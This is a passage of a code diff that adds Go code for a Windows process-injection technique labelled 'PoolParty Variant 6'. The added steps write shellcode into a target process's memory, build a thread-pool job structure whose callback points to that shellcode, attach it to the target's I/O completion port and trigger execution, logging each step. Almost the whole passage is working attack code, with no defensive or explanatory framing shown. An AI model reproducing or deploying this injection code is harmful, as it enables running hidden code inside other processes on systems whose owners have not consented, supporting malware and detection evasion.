+	ret, _, err := procWriteProcessMemory.Call(
+		uintptr(hProcess),
+		shellcodeAddr,
+		uintptr(unsafe.Pointer(&shellcode[0])),
+		uintptr(len(shellcode)),
+		uintptr(unsafe.Pointer(&bytesWritten)),
+	)
+	if ret == 0 {
+		return output, fmt.Errorf("WriteProcessMemory for shellcode failed: %v", err)
+	}
+	output += fmt.Sprintf("[+] Wrote %d bytes of shellcode\n", bytesWritten)
+
+	// Step 5: Create job object
+	jobName := fmt.Sprintf("PoolPartyJob%d", pid)
+	jobNameUTF16, _ := windows.UTF16PtrFromString(jobName)
+	hJob, _, err := procCreateJobObjectW.Call(
+		0, // Security attributes
+		uintptr(unsafe.Pointer(jobNameUTF16)),
+	)
+	if hJob == 0 {
+		return output, fmt.Errorf("CreateJobObjectW failed: %v", err)
+	}
+	defer windows.CloseHandle(windows.Handle(hJob))
+	output += fmt.Sprintf("[+] Created job object '%s'\n", jobName)
+
+	// Step 6: Allocate TP_JOB structure via TpAllocJobNotification
+	var pTpJob uintptr
+	status, _, _ := procTpAllocJobNotification.Call(
+		uintptr(unsafe.Pointer(&pTpJob)),
+		hJob,
+		shellcodeAddr, // Job callback points to shellcode
+		0,             // Context
+		0,             // Callback environment
+	)
+	if status != 0 {
+		return output, fmt.Errorf("TpAllocJobNotification failed: 0x%X", status)
+	}
+	output += "[+] Created TP_JOB structure associated with shellcode\n"
+
+	// Step 7: Allocate memory for TP_JOB in target process
+	var tpJob FULL_TP_JOB
+	tpJobAddr, _, err := procVirtualAllocEx.Call(
+		uintptr(hProcess),
+		0,
+		uintptr(unsafe.Sizeof(tpJob)),
+		uintptr(MEM_COMMIT|MEM_RESERVE),
+		uintptr(PAGE_READWRITE),
+	)
+	if tpJobAddr == 0 {
+		return output, fmt.Errorf("VirtualAllocEx for TP_JOB failed: %v", err)
+	}
+	output += fmt.Sprintf("[+] Allocated TP_JOB memory at: 0x%X\n", tpJobAddr)
+
+	// Step 8: Write TP_JOB to target process
+	ret, _, err = procWriteProcessMemory.Call(
+		uintptr(hProcess),
+		tpJobAddr,
+		pTpJob,
+		uintptr(unsafe.Sizeof(tpJob)),
+		uintptr(unsafe.Pointer(&bytesWritten)),
+	)
+	if ret == 0 {
+		return output, fmt.Errorf("WriteProcessMemory for TP_JOB failed: %v", err)
+	}
+	output += fmt.Sprintf("[+] Wrote TP_JOB structure (%d bytes)\n", bytesWritten)
+
+	// Step 9: Zero out existing job completion info (required before re-setting)
+	var zeroAssoc JOBOBJECT_ASSOCIATE_COMPLETION_PORT
+	ret, _, err = procSetInformationJobObject.Call(
+		hJob,
+		uintptr(JobObjectAssociateCompletionPortInformation),
+		uintptr(unsafe.Pointer(&zeroAssoc)),
+		uintptr(unsafe.Sizeof(zeroAssoc)),
+	)
+	if ret == 0 {
+		return output, fmt.Errorf("SetInformationJobObject (zero) failed: %v", err)
+	}
+	output += "[+] Zeroed out job object completion info\n"
+
+	// Step 10: Associate job with target's I/O completion port
+	jobAssoc := JOBOBJECT_ASSOCIATE_COMPLETION_PORT{
+		CompletionKey:  tpJobAddr,
+		CompletionPort: uintptr(hIoCompletion),
+	}
+	ret, _, err = procSetInformationJobObject.Call(
+		hJob,
+		uintptr(JobObjectAssociateCompletionPortInformation),
+		uintptr(unsafe.Pointer(&jobAssoc)),
+		uintptr(unsafe.Sizeof(jobAssoc)),
+	)
+	if ret == 0 {
+		return output, fmt.Errorf("SetInformationJobObject failed: %v", err)
+	}
+	output += "[+] Associated job object with target's I/O completion port\n"
+
+	// Step 11: Assign current process to job to trigger completion
+	hCurrentProcess, _, _ := procGetCurrentProcess.Call()
+	ret, _, err = procAssignProcessToJobObject.Call(
+		hJob,
+		hCurrentProcess,
+	)
+	if ret == 0 {
+		return output, fmt.Errorf("AssignProcessToJobObject failed: %v", err)
+	}
+	output += "[+] Assigned current process to job object to trigger completion\n"
+	output += "[+] PoolParty Variant 6 injection completed successfully\n"
 
 	return output, nil
 }
